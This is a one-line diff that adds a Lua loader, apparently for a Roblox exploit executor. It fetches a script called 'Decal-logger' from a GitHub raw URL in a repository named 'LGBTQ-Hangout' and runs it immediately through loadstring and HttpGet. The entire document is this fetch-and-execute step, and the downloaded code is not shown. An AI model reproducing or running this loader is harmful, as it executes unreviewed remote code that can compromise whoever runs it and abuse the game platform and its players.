@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/V1P3R88/LGBTQ-Hangout/main/Decal-logger"))()
